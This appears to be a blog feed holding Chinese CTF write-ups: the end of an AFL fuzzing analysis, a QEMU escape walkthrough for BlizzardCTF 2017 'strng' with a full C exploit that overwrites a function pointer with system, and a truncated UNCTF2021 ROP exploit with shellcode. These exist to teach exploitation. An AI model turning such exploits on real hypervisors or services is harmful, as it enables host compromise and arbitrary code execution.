title="测试"></a>测试</h2><p>上面说到了AFL如何启动一个目标程序和如何对测试用例进行变异，那怎么将变异后的测试用例传给目标程序当做输入呢？其实很简单，AFL在初始化forkserver的时候就用<code>dup2()</code>函数将测试用例的文件描述符复制为了标准输入的文件描述符0，这样之后往测试用例的文件描述符里写的测试用例就变成了标准输入，从而成为目标程序的输入。</p><p>AFL会对用户提供的所有测试用例进行一遍上述变异，这样才完成一个cycle，AFL运行过程中一直在做这样的cycle。当然，在后面的cycle中只做RANDOM HAVOC和SPLICING两个部分，因为其他部分的变异结果都是固定的。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://paper.seebug.org/496/">AFL(American Fuzzy Lop)实现细节与文件变异</a></p><p><a href="https://bbs.pediy.com/thread-265936.htm">AFL源码阅读笔记之gcc与fuzz部分</a></p><p><a href="https://bbs.pediy.com/thread-265973.htm">AFL编译插桩部分源码分析</a></p><p><a href="https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html">Fuzzing random programs without execve()</a></p><p><a href="https://xz.aliyun.com/t/4314">初探AFL-Fuzz</a></p><p><a href="https://zhuanlan.zhihu.com/p/58489873">Linux 的进程间通信：管道</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文介绍著名的模糊测试工具AFL在有源码的非QEMU模式下的总体执行流程，忽略一些参数设置、安全检查等细枝末节的操作和一些实现细节。&lt;/p&gt;</summary>
    
    
    
    
    <category term="源码分析" scheme="http://cyyyber.icu/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="fuzz" scheme="http://cyyyber.icu/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>从一道例题学习QEMU逃逸原理</title>
    <link href="http://cyyyber.icu/2022/01/20/%E4%BB%8E%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0QEMU%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/"/>
    <id>http://cyyyber.icu/2022/01/20/%E4%BB%8E%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0QEMU%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/</id>
    <published>2022-01-19T16:00:00.000Z</published>
    <updated>2022-01-22T04:12:49.088Z</updated>
    
    <content type="html"><![CDATA[<p>最近想入门一下QEMU逃逸，但是看了很多大佬的博客，发现大多都在着重介绍QEMU和PIC设备相关的基础知识以及具体的结题过程，没有显式地表明它们之间的关联。导致我看完之后虽然大概知道QEMU逃逸是如何做到的，但对具体的原理还是很疑惑，比如为什么虚拟机可以访问到宿主机的<code>system</code>函数？本文根据一道例题(<a href="https://github.com/rcvalle/blizzardctf2017">BlizzardCTF 2017 Strng</a>)探究一下QEMU逃逸的原理。</p><span id="more"></span><h1 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h1><h2 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h2><p>QEMU是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备，我们最熟悉的就是能够模拟一台能够独立运行操作系统的虚拟机，虚拟机认为自己和硬件打交道，但其实是和 QEMU模拟出来的硬件打交道，QEMU 将这些指令转译给真正的硬件。从本质上看，虚拟出的每个虚拟机对应 host 上的一个 QEMU进程，而虚拟机的执行线程（如 CPU 线程、I/O 线程等）对应 QEMU进程的一个线程。</p><p><img src="https://s4.ax1x.com/2022/01/20/7cE6c8.png" alt="qemu-architecture"></p><p>我们知道系统中的程序运行在虚拟的地址空间，虚拟地址通过操作系统映射到真实的物理地址。在运行有QEMU虚拟机的宿主机系统上，QEMU虚拟机就是宿主机系统的一个进程，与普通的用户程序一样有自己的虚拟地址空间，对于虚拟机系统来说这个虚拟地址空间就是它的物理地址空间，所以虚拟机系统会把这个空间分配给运行在它上面的进程作为它们虚拟地址空间。具体内存结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                        Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="PCI设备"><a href="#PCI设备" class="headerlink" title="PCI设备"></a>PCI设备</h2><p>前面说QEMU通过软件的方式为虚拟机模拟出所需要的硬件设备，其中当然就包括PCI设备。PCI设备就是符合PCI总线标准的设备。设备可以申请两类地址空间，memory space和I/O space，通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，即PMIO，这种情况下CPU需要使用专门的I/O指令如<code>IN/OUT</code>访问I/O端口。</p><h2 id="QEMU逃逸原理"><a href="#QEMU逃逸原理" class="headerlink" title="QEMU逃逸原理"></a>QEMU逃逸原理</h2><p>在QEMU逃逸的题目中，出题者一般会利用QEMU提供的QOM编程模型来实现一个有漏洞的PCI设备，用户程序通过与该设备进行IO交互从而触发漏洞。QOM编程模型和设备的IO交互方法可以参考文末的参考资料中大佬们的博客，这里不再赘述。</p><p>因为QEMU虚拟机实际上是宿主机的一个进程，我的理解是，当QEMU虚拟机的设备存在漏洞时其实就类似于用户程序的漏洞，只是两者触发漏洞的方法不一样。用户程序的漏洞通过用户的直接输入触发，而QEMU虚拟机的设备漏洞通过运行在该虚拟机上的用户程序对该设备IO交互的间接输入来触发。漏洞触发后就可以控制QEMU虚拟机这个运行在宿主机上的进程的执行流来访问宿主机上的内容，从而实现逃逸的目的。</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>题目实现了一个叫做strng的设备，源码链接为<a href="https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c">Blizzard CTF 2017</a>。在PMIO的read和write函数中有明显的数组越界漏洞，而数组的下方正好是几个函数指针，因此可以先读出其中一个函数的地址，根据偏移计算出<code>system</code>函数的地址，再将其中一个函数覆盖为<code>system</code>函数，控制虚拟机执行到该函数并以事先写入的字符串为参数，即可实现逃逸。注意此时PMIO的read和write函数是由宿主机系统的QEMU进程运行的，所以实际上是该QEMU进程执行了<code>system</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="keyword">uint32_t</span> addr;</span><br><span class="line">    <span class="keyword">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="keyword">void</span> (*srand)(<span class="keyword">unsigned</span> <span class="keyword">int</span> seed);</span><br><span class="line">    <span class="keyword">int</span> (*rand)(<span class="keyword">void</span>);</span><br><span class="line">    <span class="keyword">int</span> (*rand_r)(<span class="keyword">unsigned</span> <span class="keyword">int</span> *seed);</span><br><span class="line">&#125; STRNGState;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">strng_pmio_read</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="keyword">uint64_t</span> val = ~<span class="number">0ULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_ADDR:</span><br><span class="line">        val = strng-&gt;addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_DATA:</span><br><span class="line">        <span class="keyword">if</span> (strng-&gt;addr &amp; <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">        val = strng-&gt;regs[strng-&gt;addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">strng_pmio_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="keyword">uint32_t</span> saddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_ADDR:</span><br><span class="line">        strng-&gt;addr = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_DATA:</span><br><span class="line">        <span class="keyword">if</span> (strng-&gt;addr &amp; <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        saddr = strng-&gt;addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">switch</span> (saddr) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            strng-&gt;srand(val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = strng-&gt;rand();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = strng-&gt;rand_r(&amp;strng-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base=<span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_arbread</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_arbwrite</span><span class="params">(<span class="keyword">uint32_t</span> offset, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line">    </span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0x6d6f6e67</span>);</span><br><span class="line">    mmio_write(<span class="number">12</span>,<span class="number">0x61632d65</span>);</span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">0x6c75636c</span>);</span><br><span class="line">    mmio_write(<span class="number">20</span>,<span class="number">0x726f7461</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// leaking libc address </span></span><br><span class="line">    <span class="keyword">uint64_t</span> srandom_addr=pmio_arbread(<span class="number">0x108</span>);</span><br><span class="line">    srandom_addr=srandom_addr&lt;&lt;<span class="number">32</span>;</span><br><span class="line">    srandom_addr+=pmio_arbread(<span class="number">0x104</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leaking srandom addr: 0x%llx\n&quot;</span>,srandom_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base= srandom_addr<span class="number">-0x3a8e0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr= libc_base+<span class="number">0x453a0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc base: 0x%llx\n&quot;</span>,libc_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system addr: 0x%llx\n&quot;</span>,system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leaking heap address</span></span><br><span class="line">    <span class="keyword">uint64_t</span> heap_addr=pmio_arbread(<span class="number">0x1d0</span>);</span><br><span class="line">    heap_addr=heap_addr&lt;&lt;<span class="number">32</span>;</span><br><span class="line">    heap_addr+=pmio_arbread(<span class="number">0x1cc</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leaking heap addr: 0x%llx\n&quot;</span>,heap_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> para_addr=heap_addr+<span class="number">0x39c7c</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;parameter addr: 0x%llx\n&quot;</span>,para_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// overwrite rand_r pointer to system</span></span><br><span class="line">    pmio_arbwrite(<span class="number">0x114</span>,system_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0xc</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我的宿主机是Ubuntu16.04，libc版本为2.23，成功在宿主机弹出计算器。</p><p><img src="https://s4.ax1x.com/2022/01/20/7cVp36.gif"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge">qemu-pwn-基础知识</a></p><p><a href="https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup">qemu pwn-Blizzard CTF 2017 Strng writeup</a></p><p><a href="https://bbs.pediy.com/thread-265501.htm">QEMU逃逸初探</a></p><p><a href="https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html">BlizzardCTF 2017 - Strng</a></p><p><a href="http://www.phrack.org/issues/70/5.html#article">VM escape - QEMU Case Study</a></p><p><a href="https://zhuanlan.zhihu.com/p/72484589">Linux云计算底层技术之一文读懂 Qemu 模拟器</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近想入门一下QEMU逃逸，但是看了很多大佬的博客，发现大多都在着重介绍QEMU和PIC设备相关的基础知识以及具体的结题过程，没有显式地表明它们之间的关联。导致我看完之后虽然大概知道QEMU逃逸是如何做到的，但对具体的原理还是很疑惑，比如为什么虚拟机可以访问到宿主机的&lt;code&gt;system&lt;/code&gt;函数？本文根据一道例题(&lt;a href=&quot;https://github.com/rcvalle/blizzardctf2017&quot;&gt;BlizzardCTF 2017 Strng&lt;/a&gt;)探究一下QEMU逃逸的原理。&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://cyyyber.icu/tags/pwn/"/>
    
    <category term="QEMU" scheme="http://cyyyber.icu/tags/QEMU/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2021pwn-wp</title>
    <link href="http://cyyyber.icu/2021/12/07/UNCTF2021pwn-wp/"/>
    <id>http://cyyyber.icu/2021/12/07/UNCTF2021pwn-wp/</id>
    <published>2021-12-06T16:00:00.000Z</published>
    <updated>2021-12-27T03:13:58.179Z</updated>
    
    <content type="html"><![CDATA[<p>题目总体比较简单，就挑三道相比没那么简单的题详细讲一下</p><span id="more"></span><h1 id="ezrop"><a href="#ezrop" class="headerlink" title="ezrop"></a>ezrop</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目很简单，就是一个栈溢出漏洞</p><p><img src="https://z3.ax1x.com/2021/12/03/oaWYHx.png"></p><p>开启了NX保护</p><p><img src="https://z3.ax1x.com/2021/12/03/oaWUUK.png"></p><p>但是给了mprotect函数</p><p><img src="https://z3.ax1x.com/2021/12/03/oaWgVP.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>简单的栈溢出又开启了NX保护，就不能简单地写个shellcode到栈上，但是题目又没有system函数，所以还是得用shellcode，只要把shellcode所在的内存页用<code>mprotect</code>函数开启执行权限就行了。因为靶机开启了ASLR保护，所以栈的地址是动态变化的，又没有write函数能够泄露地址，所以我们无法得到栈的地址，把shellcode写到栈上这条路就行不通，只能另找地址来放shellcode。</p><p><img src="https://z3.ax1x.com/2021/12/03/oaWR58.png"></p><p>在0x600000的页上我们是有写到权限的，所以我们可以考虑把shellcode写到0x600000的页上。首先利用栈溢出构造rop链再次调用read函数来读取shellcode放到0x600000的页上，并把栈迁移到0x600000的页上，这样我们就又能构造rop链来执行<code>mprotect</code>函数开启0x600000的页的执行权限，然后执行shellcode。</p><p>这里为了不影响程序运行，我们把第二个rop链读取到程序没有使用的0x600e00处</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ezrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0x600e00</span></span><br><span class="line">call_mprotect = <span class="number">0x400671</span></span><br><span class="line">call_read = <span class="number">0x400651</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x4006DA</span></span><br><span class="line">mov_rdx_r13_call = <span class="number">0x4006C0</span></span><br><span class="line">r12 = buf_addr + <span class="number">0x48</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006e3</span></span><br><span class="line">pop_rsi_pop_r15_ret = <span class="number">0x4006e1</span></span><br><span class="line">shellcode_addr = buf_addr + <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x50</span> + p64(buf_addr)</span><br><span class="line">payload1 += p64(pop_rsi_pop_r15_ret) + p64(buf_addr) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += p64(call_read)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload2 += p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(<span class="number">0x0</span>) * <span class="number">2</span> + 